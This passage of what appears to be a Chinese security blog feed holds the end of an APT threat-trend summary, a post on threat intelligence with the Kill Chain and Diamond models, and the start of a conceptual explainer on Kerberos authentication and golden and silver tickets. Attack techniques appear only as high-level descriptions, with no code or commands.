id="3-远程可执行漏洞和密码爆破攻击"><a href="#3-远程可执行漏洞和密码爆破攻击" class="headerlink" title="3.远程可执行漏洞和密码爆破攻击"></a><strong>3.远程可执行漏洞和密码爆破攻击</strong></h5><p>除了鱼叉和水坑攻击，利用远程可执行漏洞和服务器口令爆破进行攻击，也成为了一种可选的攻击方式。如专业黑客组织针对驱动人生公司的攻击，该黑客组织得手后已对普通网民产生极大威胁。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B314.jpg" alt="此处输入图片的描述"></p><h4 id="2-APT攻击的技术趋势"><a href="#2-APT攻击的技术趋势" class="headerlink" title="(2)APT攻击的技术趋势"></a><strong>(2)APT攻击的技术趋势</strong></h4><h5 id="1-Fileless攻击（无文件攻击）越来越多"><a href="#1-Fileless攻击（无文件攻击）越来越多" class="headerlink" title="1.Fileless攻击（无文件攻击）越来越多"></a><strong>1.Fileless攻击（无文件攻击）越来越多</strong></h5><p>随着各安全厂商对PE文件的检测和防御能力不断的增强，A<strong>PT攻击者越来越多的开始使用无PE文件落地的攻击方式进行攻击</strong>。其主要特点是<strong>没有长期驻留在磁盘的文件、核心payload存放在网络或者注册表</strong>中，启动后通过系统进程<strong>拉取payload执行</strong>。该方式大大增加了客户端安全软件基于文件扫描的防御难度。海莲花、污水（MuddyWater）、APT29、FIN7等攻击组织都擅长使用该方式进行攻击。</p><p>如海莲花组织事先的通过计划任务执行命令，全程无文件落地：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B315.jpg" alt="此处输入图片的描述"></p><h5 id="2-C-C存放在公开的社交网站上"><a href="#2-C-C存放在公开的社交网站上" class="headerlink" title="2.C&amp;C存放在公开的社交网站上"></a><strong>2.C&amp;C存放在公开的社交网站上</strong></h5><p><strong>通信跟数据回传是APT攻击链中非常重要的环节</strong>，因此如何使得通信的C&amp;C服务器被防火墙发现成为了攻击者的难题。因此，<strong>除了注册迷惑性极强的域名、使用DGA、隐蔽信道等方式外，攻击者把目光集中到了公开的社交网络上，如youtube、github、twitter等上。</strong></p><p>如某次针对英国和瑞士的攻击，C&amp;C存放地址：</p><p>YouTube：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B316.jpg" alt="此处输入图片的描述"></p><p> Twitter：</p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B317.jpg" alt="此处输入图片的描述"></p><p> Wordpress博客：</p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B318.jpg" alt="此处输入图片的描述"></p><p> Google plus：</p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B319.jpg" alt="此处输入图片的描述"></p><h5 id="3-公开或者开源工具的使用"><a href="#3-公开或者开源工具的使用" class="headerlink" title="3.公开或者开源工具的使用"></a><strong>3.公开或者开源工具的使用</strong></h5><p>往往，APT组织都有其自己研发的特定的攻击武器库，但是随着安全厂商对APT组织研究的深入，APT组织开始使<strong>用一些公开或者开源的工具来进行攻击，以此来增加溯源以及被发现的难度。</strong></p><p>如SYSCON&#x2F;KONNI，使用开源的babyface木马和无界面的teamview（著名远程控制工具）来进行攻击：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B320.jpg" alt="此处输入图片的描述"></p><h5 id="4-多平台攻击和跨平台攻击"><a href="#4-多平台攻击和跨平台攻击" class="headerlink" title="4.多平台攻击和跨平台攻击"></a><strong>4.多平台攻击和跨平台攻击</strong></h5><p>移动互联网的成熟，使得人们已经很少在工作之余使用电脑，因此<strong>使用移动端来进行攻击，也越来越被APT攻击组织使用</strong>。此外Mac OS的流行，也是的APT攻击者也开始对MacOS平台进行攻击。如“人面马”(APT34)、蔓灵花、Group123、双尾蝎（APT-C-23）、黄金鼠（APT-C-27）等组织都擅长使用多平台攻击。此外黄金鼠（APT-C-27）还使用了在APK中打包了PE文件，运行后释放到移动端外置存储设备中的图片目录下，从而实现跨平台的攻击：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B321.jpg" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/APT%E7%9B%B8%E5%85%B322.jpg" alt="此处输入图片的描述"></p><h3 id="2-多样化的攻击投放方式"><a href="#2-多样化的攻击投放方式" class="headerlink" title="2.多样化的攻击投放方式"></a><strong>2.多样化的攻击投放方式</strong></h3><h4 id="1-文档投放的形式多样化"><a href="#1-文档投放的形式多样化" class="headerlink" title="(1)文档投放的形式多样化"></a><strong>(1)文档投放的形式多样化</strong></h4><p>在过去的APT 威胁或者网络攻击活动中，利用邮件投递恶意的文档类载荷是非常常见的一种攻击方式，例如<strong>鱼叉邮件攻击或BEC 攻击，垃圾邮件攻击等</strong>。而<strong>通常投放的文档大多为Office 文档类型，如doc、docx，xls，xlsx 等。</strong></p><p>针对特定地区、特定语言或者特定行业的目标人员，攻击者可能会投放一些其他的文档类型载荷，例如<strong>针对韩国人员投放HWP 文档</strong>，<strong>针对巴基斯坦地区投放InPage 文档</strong>，或者针对<strong>工程建筑行业人员投放恶意的<br>AutoCAD</strong> 文档等等。</p><p>攻击者也可能使用一些<strong>其他扩展名的文档类型</strong>并同样可以被Office 应用打开**，如.iqy，**虽然其在APT 威胁中不是很常见，但已经应用在一些更广泛的垃圾邮件攻击活动中。</p><h4 id="2-利用文件格式的限制"><a href="#2-利用文件格式的限制" class="headerlink" title="(2)利用文件格式的限制"></a><strong>(2)利用文件格式的限制</strong></h4><p>APT 攻击者通常会利用一些文件格式和<strong>显示上的特性</strong>用于<strong>迷惑受害用户或安全分析人员</strong>。这里以LNK 文件为例。<strong>LNK 文件显示的目标执行路径仅260 个字节，多余的字符将被截断</strong>，</p><p>而在跟踪蓝宝菇的攻击活动中，<strong>该组织投放的LNK 文件在目标路径字符串前面填充了大量的空字符，所以直接查看无法明确其执行的内容，需要解析LNK 文件结构获取</strong>,APT29 也常用这种方式执行PowerShell 脚本</p><h4 id="3-利用新的系统文件格式特性"><a href="#3-利用新的系统文件格式特性" class="headerlink" title="(3)利用新的系统文件格式特性"></a><strong>(3)利用新的系统文件格式特性</strong></h4><p>2018 年6 月，国外安全研究人员公开了利用<strong>Windows 10 下才被引入的新文件类型“.SettingContent-ms”执行任意命令的攻击技巧</strong>，并公开了POC。而该新型攻击方式被公开后就立刻<strong>被黑客和APT组织纳入攻击武器库用于针对性攻击，并衍生出各种利用方式</strong>：诱导执行、利用Office 文档执行、利用PDF 文档执行。</p><h4 id="4-利用旧的技术实现攻击"><a href="#4-利用旧的技术实现攻击" class="headerlink" title="(4)利用旧的技术实现攻击"></a><strong>(4)利用旧的技术实现攻击</strong></h4><p>一些被认为<strong>陈旧而古老的文档特性可以被实现并用于攻击</strong>，360 威胁情报中心在2018 年就针对利用Excel 4.0 宏传播商业远控木马的在野攻击样本进行了分析。该技术最早是于2018 年10 月6 日由国外安全厂商Outflank的安全研究人员首次公开，并展示了使用Excel 4.0 宏执行ShellCode 的利用<br>代码**。Excel 4.0 宏是一个很古老的宏技术，微软在后续使用VBA 替换了该特性，但从利用效果和隐蔽性上依然能够达到不错的效果**</p><h3 id="3-0day-漏洞和在野利用"><a href="#3-0day-漏洞和在野利用" class="headerlink" title="3.0day 漏洞和在野利用"></a><strong>3.0day 漏洞和在野利用</strong></h3><p>0day 漏洞的在野利用，一般是指攻击活动被捕获时，发现其利用了某些0day 漏洞（攻击活动与攻击样本分析本身也是0day 漏洞发现的重要方法之一）。而在所有有能力挖掘和利用0day 漏洞的组织中，<strong>APT 组织首当其冲。</strong></p><p>0day 漏洞在野利用的频频现身，事实上是在<strong>倒逼安全企业必须打破传统的攻防理念</strong>，实现安全能力的大幅提升与技术体系的全面升级。这主要表现在两个方面：</p><h4 id="1-安全企业必须在漏洞挖掘和攻防能力建设上进行持续的投入"><a href="#1-安全企业必须在漏洞挖掘和攻防能力建设上进行持续的投入" class="headerlink" title="(1)安全企业必须在漏洞挖掘和攻防能力建设上进行持续的投入"></a><strong>(1)安全企业必须在漏洞挖掘和攻防能力建设上进行持续的投入</strong></h4><p>从某种程度上来说，0day 漏洞的独立发现能力，已经成为APT 研究的必备技能，也是衡量安全厂商在APT 方面攻防水平的重要指标之一。</p><h4 id="2-大数据和威胁情报能力将成为新型IT-基础设施安全体系建设的关键"><a href="#2-大数据和威胁情报能力将成为新型IT-基础设施安全体系建设的关键" class="headerlink" title="(2)大数据和威胁情报能力将成为新型IT 基础设施安全体系建设的关键"></a><strong>(2)大数据和威胁情报能力将成为新型IT 基础设施安全体系建设的关键</strong></h4><p>因为从理论上说，<strong>0day 漏洞利用是不可防御的</strong>；既然防不住，<strong>就应该更多的从快速发现、快速响应来着手</strong>建设新的安全体系，而大数据和威胁情报能力正是这种体系的核心和关键。</p><h2 id="0X05-APT-威胁到归属挑战"><a href="#0X05-APT-威胁到归属挑战" class="headerlink" title="0X05 APT 威胁到归属挑战"></a><strong>0X05 APT 威胁到归属挑战</strong></h2><p>APT 威胁活动的归属分析一直是APT 威胁分析中最为重要的一个环节，目前，<strong>绝大多数安全机构在做APT 活动的归属分析时，主要的判断依据包括以下几点：</strong></p><p>1） APT 组织使用的<strong>恶意代码特征的相似度</strong>，如包含特有的元数据，互斥量，加密算法，签名等等。<br>2） APT 组织历史使用<strong>控制基础设施的重叠</strong>，本质即pDNS 和whois 数据的重叠。<br>3） APT 组织使用的<strong>攻击TTP</strong>。<br>4） 结合攻击留下的线索中<strong>的地域和语言特征，或攻击针对的目标和意图</strong>，推测其攻击归属的APT 组织<br>5） <strong>公开情报</strong>中涉及的归属判断依据</p><p>但APT <strong>攻击者会尝试规避和隐藏攻击活动中留下的与其角色相关的线索，或者通过false flag（假旗行动）和模仿其他组织的特征来迷惑分析人员</strong>。针对韩国平昌奥运会的攻击组织Hades 就是一个最好的说明。</p><h2 id="0X06-APT-威胁的演变趋势"><a href="#0X06-APT-威胁的演变趋势" class="headerlink" title="0X06 APT 威胁的演变趋势"></a><strong>0X06 APT 威胁的演变趋势</strong></h2><p>从2018 年的APT 威胁态势来看，我们推测APT 威胁<strong>活动的演变趋势可能包括如下几个方面：</strong></p><p>1） <strong>APT 组织可能发展出更加明确的组织化特点</strong>，例如小组化，各个攻击小组可能针对特定行业实施攻击并达到特定的攻击目的，但其整体可能共享部分攻击代码或资源。</p><p>2） APT 组织在初期的攻击尝试和获得初步控制权阶段可能<strong>更倾向于使用开源或公开的攻击工具或系统工具，只有对高价值目标或为维持长久性的控制时，才会使用其自身特有的成熟的攻击代码。</strong></p><p>3） APT 组织针对的目标行业可能进一步**延伸到一些传统行业或者和国家关键信息基础建设相关的行业和机构。**随着这些行业逐渐的互联化和智能化，其安全防御上的弱点将会被越来越多的利用，供应链攻击也会越来越频繁。</p><p>4） <strong>APT 组织会进一步加强0day漏洞能力的储备</strong>，并且可能覆盖多个平台，包括PC，服务器，移动终端，路由器，甚至<strong>工控设备</strong>等。</p><h2 id="0X07-参考链接"><a href="#0X07-参考链接" class="headerlink" title="0X07 参考链接"></a><strong>0X07 参考链接</strong></h2><p><a href="https://s.tencent.com/research/report/623.html">https://s.tencent.com/research/report/623.html</a><br><a href="http://zt.360.cn/1101061855.php?dtid=1101062514&did=210827151">http://zt.360.cn/1101061855.php?dtid=1101062514&amp;did=210827151</a></p>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>威胁情报概念与APT事件分析模型概述</title>
    <link href="/2019/03/19/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%A6%82%E5%BF%B5%E4%B8%8EAPT%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/"/>
    <url>/2019/03/19/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%A6%82%E5%BF%B5%E4%B8%8EAPT%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0X01-基本信息："><a href="#0X01-基本信息：" class="headerlink" title="0X01 基本信息："></a><strong>0X01 基本信息：</strong></h2><h3 id="1-威胁情报的定义："><a href="#1-威胁情报的定义：" class="headerlink" title="1.威胁情报的定义："></a><strong>1.威胁情报的定义：</strong></h3><p>威胁情报是关于IT或信息资产所面临的<strong>现有</strong>或<strong>潜在</strong>威胁的循证知识，包括情境、机制、指标、推论与可行建议，这些知识可为威胁响应提供决策依据。</p><h3 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a><strong>2.分类</strong></h3><p>按照不同标准威胁情报有多种不同的分类方式，首先根据数据本身威胁情报可以分<strong>为HASH值</strong>、<strong>IP地址</strong>、<strong>域名</strong>、<strong>网络或主机特征</strong>、**TTPs（Tactics、Techniques &amp; Procedures）**这几种，其源于David J. Bianco在《The Pyramid of Pain》一文中提出的威胁情报相关指标（单一的信息或数据一般算不上威胁情报，经过分析处理过的有价值的信息才称得上威胁情报）的金字塔模型。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A52.png" alt="此处输入图片的描述"></p><span id="more"></span><p>左侧是能够利用的情报，右侧是这些情报给攻击者造成的困难程度。一般来说情报中价值最低的是Hash值、IP地址和域名（也就是常说的信誉库），其次是网络&#x2F;主机特征、攻击工具特征，对攻击者影响最大的是TTPs（战术、技术和行为模式）类型的威胁情报。这里分别做个简单介绍：</p><p>**HASH值：**一般指样本、文件的HASH值，比如MD5和SHA系列。由于HASH函数的雪崩效应，文件任何微弱地改变，都会导致产生一个完全不同也不相关的哈希值。这使得在很多情况下，它变得不值得跟踪，所以它带来的防御效果也是最低的。</p><p>**IP地址：**常见的指标之一，通过IP的访问控制可以抵御很多常见的攻击，但是又因为IP数量太大，任何攻击者均可以尝试更改IP地址，以绕过访问控制。</p><p>**域名：**有些攻击类型或攻击手法也或者出于隐藏的目的，攻击者会通过域名连接外部服务器进行间接通信，由于域名需要购买、注册、与服务器绑定等操作使得它的成本相对IP是比较高的，对域名的把控产生的防御效果也是较好的。但是对于高级APT攻击或大规模的团伙攻击，往往会准备大量备用域名，所以它的限制作用也是有限。</p><p>**网络或主机特征：**这里指的特征可以是很多方面，比如攻击者浏览器的User-Agent、登录的用户名、访问的频率等，这些特征就是一种对攻击者的描述，这些情报数据可以很好的将攻击流量从其他的流量中提取出来，就会产生一种较好的防御效果。</p><p>**攻击工具：**这里是指获取或检测到了攻击者使用的工具，这种基于工具的情报数据能够使得一批攻击失效，攻击者不得不进行免杀或重写工具，这就达到了增加攻击成本的目的。</p><p><strong>TTPs</strong>：Tactics、Techniques &amp; Procedures的缩写，这里是指攻击者所使用的攻击策略、手法等，掌握了些信息就能明白攻击者所利用的具体漏洞，就能够针对性的布防，使得攻击者不得不寻找新的漏洞，所以这也是价值最高的情报数据。</p><p><strong>按照传统的分类方法威胁情报分为以下三类</strong></p><p>**战术级情报：**战术情报的作用主要是发现威胁事件以及对报警确认或优先级排序。常见的失陷检测情报（CnC 情报，即攻击者控制被害主机所使用的远程命令与控制服务器情报）、IP情报就属于这个范畴，它们都是可机读的情报，可以直接被设备使用，自动化的完成上述的安全工作。</p><p>**运营级情报：**运营级情报是给安全分析师或者说安全事件响应人员使用的，目的是对已知的重要安全事件做分析（报警确认、攻击影响范围、攻击链以及攻击目的、技战术方法等）或者利用已知的攻击者技战术手法主动的查找攻击相关线索。</p><p>**战略级情报：**战略层面的威胁情报是给组织的安全管理者使用的，比如CSO。它能够帮助决策者把握当前的安全态势，在安全决策上更加有理有据。包括了什么样的组织会进行攻击，攻击可能造成的危害有哪些，攻击者的战术能力和掌控的资源情况等，当然也会包括具体的攻击实例。</p><h3 id="3-意义"><a href="#3-意义" class="headerlink" title="3.意义"></a><strong>3.意义</strong></h3><p>传统的防御机制根据以往的“经验”构建防御策略、部署安全产品，难以应对未知攻击；即使是基于机器学习的检测算法也是在过往“经验”（训练集）的基础寻找最佳的一般表达式，以求覆盖所有可能的情况，实现对未知攻击的检测。但是过往经验无法完整的表达现在和未来的安全状况，而且攻击手法变化多样，防御技术的发展速度本质上落后与攻击技术的发展速度。所以需要一种能够根据过去和当前网络安全状况动态调整防御策略的手段，威胁情报应运而生。<strong>通过对威胁情报的收集、处理可以直接将相应的结果分发到安全人员（认读）和安全设备（机读），实现精准的动态防御，达到“未攻先防”的效果。</strong></p><h2 id="0X02-APT-事件的分析与防御"><a href="#0X02-APT-事件的分析与防御" class="headerlink" title="0X02 APT 事件的分析与防御"></a><strong>0X02 APT 事件的分析与防御</strong></h2><h3 id="1-威胁情报在事件分析中的定位"><a href="#1-威胁情报在事件分析中的定位" class="headerlink" title="1.威胁情报在事件分析中的定位"></a><strong>1.威胁情报在事件分析中的定位</strong></h3><p>威胁情报数据并<strong>不能帮助甲方来预测攻击</strong>，威胁情报在安全运营体系中的定位是——<strong>辅助发现潜在的或正在发起的恶意行为或操作</strong>，重点在于<strong>辅助</strong>两个字，威胁情报严格意义上来说只能<strong>有限地感知潜在的威胁</strong>，换句话说：如果有人现在瞄准的目标全部都是能源类客户，那么威胁情报就可以提醒没有被攻击的客户可能会遭受到该攻击者的攻击，这个叫做有限的感知潜在的威胁。</p><p>威胁情报既然是个辅助手段，那么肯定有一个主要手段，这个主要的手段其实就是<strong>针对事件的分析</strong>，接下来主要说的是两个分析使用的模型——<strong>钻石模型</strong>和<strong>Kill-Chain模型</strong>，这两个模型在分析的时候往往需要结合起来使用，尤其是比较大型的针对性的攻击诸如APT攻击。</p><h3 id="2-Kill-Chain模型"><a href="#2-Kill-Chain模型" class="headerlink" title="2.Kill-Chain模型"></a><strong>2.Kill-Chain模型</strong></h3><p>Kill-Chain模型分为7个部分，侦查阶段（Reconnaissance）、武器化阶段（Weaponization）、部署阶段（Delivery）、攻击阶段（Exploitation）、后门植入阶段（Installation）、远程控制阶段（C&amp;C）、后渗透阶段（Actives on Objects），也就是下面这个样子：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A53.jpg" alt="此处输入图片的描述"></p><ul><li>侦查阶段：扫描目标IT资产和<strong>信息收集</strong>，比如说<a href="https://github.com/K0rz3n/GoogleHacking-Page">Google Hacking</a>这些侦查类型的攻击</li><li>武器化阶段：将前一阶段发现和扫描到漏洞的信息整合到一起并<strong>制作针对性的武器</strong>（当然国内的嘛，你懂得）</li><li>部署阶段：将这些武器或者是远控RAT<strong>部署</strong>到对应的Compromised Servers上</li><li>攻击阶段：使用这些Compromised Servers和之前做好的武器化工具<strong>对目标发起攻击</strong></li><li>后门种植阶段：<strong>安装远程控制</strong>的服务和进程</li><li>远控阶段：让目标<strong>和C&amp;C通信</strong></li><li>后渗透阶段：收割、继续<strong>横向渗透入侵</strong></li></ul><h3 id="3-钻石模型"><a href="#3-钻石模型" class="headerlink" title="3.钻石模型"></a><strong>3.钻石模型</strong></h3><p>之前说过了<strong>一次完整的攻击行为的参考就是上面说到的Kill-Chain</strong>，也就是用来描述的攻击者攻击的路线和进行的进度。但是Kill-Chain只能说明攻击的进程和路线，并不能很好地<strong>说明其造成的影响和目的</strong>，钻石模型就很好的针对性的补充了这点。</p><p>钻石模型是一个针对<strong>单个事件</strong>分析的模型，核心就是用来描述攻击者的技战术和目的，具体的钻石模型如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A54.jpg" alt="此处输入图片的描述"></p><p><strong>总结一下这幅图就是说明：攻击者因为什么原因，利用哪些基础设施，并通哪些手段攻击了怎么样的一个目标</strong></p><p>具体一点的关于图中信息的解释如下：</p><p>**社会政治影响：**处于钻石模型上下两个顶点，上顶点表示攻击者，下顶点表示受害者也就是目标。攻击者和受害者之间的某种利益冲突或者是社会地位对立则会产生攻击的意图和发起攻击的原因，纵切面表示的就是社会政治影响。说大白话就是根据这俩人去发现攻击的意图。</p><p>**技战术组合：**技战术组合位于整个钻石模型的横切面，横切面的两个顶点分别为基础设施和技术能力，这里的基础设施和技术能力其实都是相对于攻击者而言的。</p><p>**元数据：**这个其实就是左边列出来的，攻击时间、攻击阶段、攻击结果、攻击方向、攻击手段、攻击资源利用</p><p>**置信度：**也就是以上你分析出结果的可信程度。</p><blockquote><p><strong>注意：</strong></p><p>这里要提醒一点，但凡基于威胁情报做分析的时候一定要牢记以下4点：</p><p>1.威胁情报分析出来的结果一般不能作为电子证据确定嫌疑人有计算机犯罪行为<br>2.威胁情报分析结果须带有严格的置信度<br>3.威胁情报数据由于技术原因限制不可以做到实时性<br>4.要在相关机构的监管下进行分析</p></blockquote><h3 id="4-Kill-Chain与钻石模型的组合分析"><a href="#4-Kill-Chain与钻石模型的组合分析" class="headerlink" title="4.Kill-Chain与钻石模型的组合分析"></a><strong>4.Kill-Chain与钻石模型的组合分析</strong></h3><p>复杂的攻击往往都是有一系列的攻击事件组成的，不同的攻击事件指向的目标和达到的目的可以表示出攻击的进程，那么OK，我们如果把事件按照Kill-Chain进行分类同时使用泳道图进行表示，同时把不同的攻击路线分为不同的攻击线程，那么我们就可以得到一个这样的泳道图。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A55.jpg" alt="此处输入图片的描述"></p><p><strong>其实这张图描述的是这么一个事件：</strong></p><p>1.攻击者先对目标进行了Google Hacking操作，获得了他们域名解析记录等一些基础的It信息<br>2.攻击者找到了一个目标新注册的域名，然后用搜索引擎搜索他们的网络管理员的电子邮件信息<br>3.攻击者使用鱼叉邮件方式对目标的网络管理员发送一封带有木马的邮件<br>4.目标的网管（我们叫他网管一号）打开了这封邮件的附件然后不幸中枪<br>5.网管一号的主机因为中了病毒，所以攻击者利用网管一号这台主机发送了一个HTTP Post请求到域控节点，然后域控节点返回了一个HTTP Response<br>6.我们通过对鱼叉邮件中附件进行逆向分析发现里面有两个IP地址，第二个IP地址作为备份，防止第一个失效<br>7.通过C&amp;C请求到网管一号的主机，我们的恶意程序打开了一个TCP代理服务<br>8.通过网管一号主机上的代理服务，攻击者继续去Google上搜索其他的目标<br>9.攻击者检查网管一号邮件的通信录列表去寻找是否拥有目标二号的通讯方式，结果发现了目标二号的首席科学家的联系方式<br>10.攻击者使用攻陷的网管一号的邮箱对目标二号的首席科学家的邮箱发起鱼叉邮件攻击，工具使用和之前一样的<br>11.此时又来了一个攻击者，我们称他为攻击者二号，攻击者一号扫描了目标三号的web服务器<br>12.使用同样的漏洞利用工具攻击发现目标三号主机上的相同的漏洞<br>13.被攻陷的目标三号主机返回一个shell会话给攻击者三号<br>14.目标三号的所有数据被攻击者三号窃取</p><p>这样的话使用Kill-Chain和钻石模型分析可以同时get到攻击者的点和想要攻击的目标，同时还知道了他的攻击路径，也就是说这时候我们对攻击者了如指掌了。</p><h3 id="5-基于Kill-Chain的安全防护矩阵："><a href="#5-基于Kill-Chain的安全防护矩阵：" class="headerlink" title="5.基于Kill-Chain的安全防护矩阵："></a><strong>5.基于Kill-Chain的安全防护矩阵：</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A56.jpg" alt="此处输入图片的描述"></p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>本文按照网上的资料对威胁情报和 APT 事件的分析方法进行了简单的阐述，丰富了自己对情报分析方面的认知。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/fly_hps/article/details/82744104">https://blog.csdn.net/fly_hps/article/details/82744104</a><br><a href="https://zhuanlan.zhihu.com/p/30105006">https://zhuanlan.zhihu.com/p/30105006</a><br><a href="https://zhuanlan.zhihu.com/p/30160133">https://zhuanlan.zhihu.com/p/30160133</a><br><a href="https://zhuanlan.zhihu.com/p/30197024">https://zhuanlan.zhihu.com/p/30197024</a><br><a href="https://www.xmanblog.net/threat-intelligence/">https://www.xmanblog.net/threat-intelligence/</a></p>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析 Kerberos 认证过程以及黄金票据和白银票据</title>
    <link href="/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
    <url>/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>玩 Windows 域渗透的时候经常会听到的就是黄金票据和白银票据的利用了(虽然比较老的技术，但是始终是强力的武器)。这两个概念是在 kerberos 的认证过程中出现的，咱们先不谈利用，就是从理解整个流程上看也是比较困难的，因为kerberos 的认证过程确实是比较复杂的，不仅记不住，而且可能看了又看最后还没找到整个过程中哪个是黄金票据哪个又是白银票据，我个人也是这样，于是才有了这篇文章。</p><h2 id="0X01-Windows-的认证协议"><a href="#0X01-Windows-的认证协议" class="headerlink" title="0X01 Windows 的认证协议"></a><strong>0X01 Windows 的认证协议</strong></h2><p>Windows 的认证协议主要有两种，一种是 NTLM 另一种是 Kerberos </p><h3 id="1-NTLM"><a href="#1-NTLM" class="headerlink" title="1.NTLM"></a><strong>1.NTLM</strong></h3><p>NTLM 的认证机制是一种基于挑战、应答的Windows 早期的认证机制，因为其安全性不高，于是从 Windows 2000  开始已经默认不再使用，而是使用了 Kerberos 其作为域的默认认证协议，因为和本文关系不大，所以这里就不详细介绍了。</p><h3 id="2-Kerberos"><a href="#2-Kerberos" class="headerlink" title="2.Kerberos"></a><strong>2.Kerberos</strong></h3><p>相对于ntlm而言,kerberos的认证方式就要复杂的多,因为它提供了一个<strong>集中式</strong>的认证方式,在整个认证过程中总共要涉及到三方:客户端、服务端和KDC(Kerberos起源于希腊神话，是一支守护着冥界长着3个头颅的神犬，在keberos Authentication中，Kerberos的3个头颅代表中认证过程中涉及的3方),<strong>在Windows域环境中,KDC的角色常常由DC(Domain Controller)来担任</strong>,Kerberos是一种<strong>基于票据的认证方式</strong>,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,<strong>Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务(票据窃取问题)</strong></p><p><strong>下图是 Kerberos 的认证过程示意图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B1.png" alt="此处输入图片的描述"></p><span id="more"></span><blockquote><p><strong>注：这里面涉及到的一些名词缩写</strong></p><ul><li>KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS</li><li>AS(Authentication Server):身份认证服务</li><li>TGS(Ticket Granting Server):票据授予服务,<strong>该服务提供的票据也称为 TGS 或者叫白银票据</strong></li><li>TGT(Ticket Granting Ticket):由身份认证服务授予的票据**(黄金票据)**，用于身份认证，存储在内存，默认有效期为10小时</li></ul></blockquote><h2 id="0X02-分析开始"><a href="#0X02-分析开始" class="headerlink" title="0X02 分析开始"></a><strong>0X02 分析开始</strong></h2><p>认证的核心目的就是让通信双方确认对方的真实身份，那么如果一个客户端要和一个服务器端通信，该怎么认证呢？我们现在一步步开始分析</p><h3 id="1-初步思考共享密钥模式"><a href="#1-初步思考共享密钥模式" class="headerlink" title="1.初步思考共享密钥模式"></a><strong>1.初步思考共享密钥模式</strong></h3><p>首先我们想客户端可以把自己的身份信息，以及通过双方共享的密钥加密后的身份信息打包一起发给服务器，然后服务器通过与客户端共享的密钥解密，再和传过来的明文的身份信息比对来确认客户端的身份。</p><p>看上去很不错，但是你有没有想过**他们是怎么共享这个密钥的呢？**那这个时候密钥分配中心 KDC 这个角色(KDC往往由 DC 充当，并且有着所有客户端和服务器的 <strong>master key–&gt;也就是密码对应的 Hash值</strong> )就要排上用场了(而且这个共享秘钥还不能是简单的使用客户端密码的 hash 值这种长时间不变的值，因为长时间不变的值就给了攻击者足够的时间去破译)</p><h3 id="2-KDC-作为可信第三方分配共享密钥Skey1"><a href="#2-KDC-作为可信第三方分配共享密钥Skey1" class="headerlink" title="2.KDC 作为可信第三方分配共享密钥Skey1"></a><strong>2.KDC 作为可信第三方分配共享密钥Skey1</strong></h3><p>KDC 可以在客户端请求与服务器通信的临时密钥 Skey1 的时候，根据客户端提供的通信双方的身份信息从数据库中找到他们各自的 master key 然后分别加密两份 Skey1 ，一份给客户端，另一份给服务器端(发送给服务器端的内容除了 Skey1 以外还有 